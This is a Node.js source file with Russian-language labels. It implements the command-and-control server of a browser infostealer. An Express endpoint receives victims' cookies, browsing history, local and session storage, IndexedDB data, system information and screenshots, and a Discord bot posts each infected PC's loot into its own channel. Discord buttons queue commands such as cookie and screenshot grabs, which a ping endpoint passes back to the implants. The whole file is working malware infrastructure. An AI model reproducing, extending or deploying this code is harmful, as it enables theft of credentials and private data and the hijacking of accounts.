import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import http from "http";
import crypto from "crypto";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_BASE_PC = "Все ПК";
const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";
const MAX_FILE_SIZE = 6 * 1024 * 1024;

const onlinePCs = {};
const pendingCommands = {};
const pcData = {};
const channelByPC = {};

let logChannelCache = null;
let categoryCacheByGuild = new Map();
let channelCacheByGuild = new Map();

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

function shortHash(s, len = 8) { 
    return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); 
}

function safeChannelName(prefix, id) { 
    return `${prefix}-${shortHash(id, 8)}`.toLowerCase().replace(/[^a-z0-9\-]/g, '-').slice(0, 90); 
}

async function logToDiscord(msg) {
    try {
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    } catch (e) { console.error("Ошибка логирования:", e); }
}

async function getOrCreateCategory(guild, name) {
    const gid = guild.id;
    if (!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid, {});
    const cache = categoryCacheByGuild.get(gid);
    if (cache[name]) return cache[name];
    const channels = await guild.channels.fetch();
    const match = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if (match) { cache[name] = match; return match; }
    const created = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild, name, parentId) {
    const gid = guild.id;
    if (!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);
    const key = `${name}::${parentId}`;
    if (cache[key]) return cache[key];
    const channels = await guild.channels.fetch();
    const match = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
    if (match) { cache[key] = match; return match; }
    const created = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    cache[key] = created;
    return created;
}

async function getOrCreateLogChannel(guild) {
    if (logChannelCache) return logChannelCache;
    const category = await getOrCreateCategory(guild, LOG_CATEGORY);
    logChannelCache = category;
    const channels = await guild.channels.fetch();
    const match = channels.find(c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL && c.parentId === category.id);
    if (match) return match;
    const created = await guild.channels.create({ name: LOG_CHANNEL, type: ChannelType.GuildText, parent: category.id });
    return created;
}

function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

bot.on("interactionCreate", async interaction => {
    if (!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
});

function safeFileChunking(str, maxBytes) {
    const chunks = [];
    let i = 0;
    while (i < str.length) { chunks.push(str.slice(i, i + maxBytes)); i += maxBytes; }
    return chunks;
}

async function sendJsonFile(channel, nameBase, jsonData) {
    const str = JSON.stringify(jsonData, null, 2);
    if (Buffer.byteLength(str) <= MAX_FILE_SIZE) {
        await channel.send({ files: [{ attachment: Buffer.from(str), name: `${nameBase}.json` }] });
    } else {
        const chunks = safeFileChunking(str, MAX_FILE_SIZE);
        for (let i = 0; i < chunks.length; i++) {
            await channel.send({ content: `📄 Файл ${nameBase} часть ${i+1}/${chunks.length}`, files: [{ attachment: Buffer.from(chunks[i]), name: `${nameBase}-part${i+1}.json` }] });
        }
    }
}

// ---------- Upload PC ----------
app.post("/upload-pc", async (req, res) => {
    try {
        const { pcId, cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers };

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc', pcId);
        let finalChannel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        if (!finalChannel) finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
        channelByPC[pcId] = finalChannel.id;

        // отправляем все данные
        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
        if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
        if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
        if (localStorage) await sendJsonFile(finalChannel, `${channelName}-localStorage`, localStorage);
        if (sessionStorage) await sendJsonFile(finalChannel, `${channelName}-sessionStorage`, sessionStorage);
        if (indexedDB) await sendJsonFile(finalChannel, `${channelName}-indexedDB`, indexedDB);
        if (serviceWorkers) await sendJsonFile(finalChannel, `${channelName}-serviceWorkers`, serviceWorkers);
        if (screenshot) await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }] });

        await finalChannel.send({ content: `🟢 ПК **${pcId}** обновлён`, components: createControlButtons(pcId) });
        res.json({ success: true });
    } catch (e) { await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); res.status(500).json({ error: e.message }); }
});

// ---------- Ping ----------
app.post("/ping", (req, res) => {
    const { pcId } = req.body;
    if (!pcId) return res.status(400).json({ error: "pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

const server = http.createServer(app);
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));
